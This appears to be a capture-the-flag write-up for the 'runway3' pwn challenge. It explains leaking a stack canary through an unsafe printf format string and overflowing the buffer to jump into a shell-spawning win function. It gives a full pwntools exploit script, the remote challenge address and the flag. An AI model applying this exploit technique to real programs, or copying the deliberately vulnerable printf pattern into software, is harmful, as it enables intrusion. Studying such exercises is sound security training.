https://ctftime.org/event/2449

# runway3 (pwn)

A new technique!

nc challs.pwnoh.io 13403

## Analysis

We can see that this binary is a 64 bit x86 ELF with canaries but no PIE:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

We can overflow the buffer on the stack in `echo` however due to the stack canary we must first leak its value in order to overwrite both it and the return address:

```C
int echo(int amount) {
    char message[32];

    fgets(message, amount, stdin);

    printf(message);
    fflush(stdout);
}
```

We can use the `printf` with an attacker controlled string in `echo` to leak the value of the canary on the stack. We can do this with the format string `"%13$p"`. You can experiment with different values to come to this value.

Once we have learnt the value of the canary on the stack we can safely smash the stack with the address of the `win` function:

```C
int win() {
    printf("You win! Here is your shell:\n");
    fflush(stdout);

    system("/bin/sh");
}
```

## Solution

1) Leak the canary with the attacker controlled format string in `echo`
2) Overwrite the return address on the stack in `echo` with `fgets`
3) Note that jumping to the start of `win` leaves the stack unaligned and causes the program to crash later when an instruction which assumes the stack is aligned to 16 bytes finds that it is not. Therefore we jump to `win` + 0x17 which is the offset of the instruction after the stack is manipulated. This results in the stack being correctly aligned upon entry to `win`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./runway3", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("challs.pwnoh.io", 13403)

p.sendlineafter(b"?\n", b"%13$p")
canary = int(p.readline().decode(), 16)

payload = b"A" * 0x28
payload += p64(canary)
payload += p64(0)
payload += p64(elf.sym["win"] + 0x17)

p.sendline(payload)

p.recv(0x28)

p.sendline(b"/bin/cat flag.txt")

p.interactive() # bctf{wh0_kn3w_pr1nt1ng_w4s_s0_d4nG3R0Us_11aabc3287e74603}
```

## Flag
`bctf{wh0_kn3w_pr1nt1ng_w4s_s0_d4nG3R0Us_11aabc3287e74603}`

smiley 2024/09/29
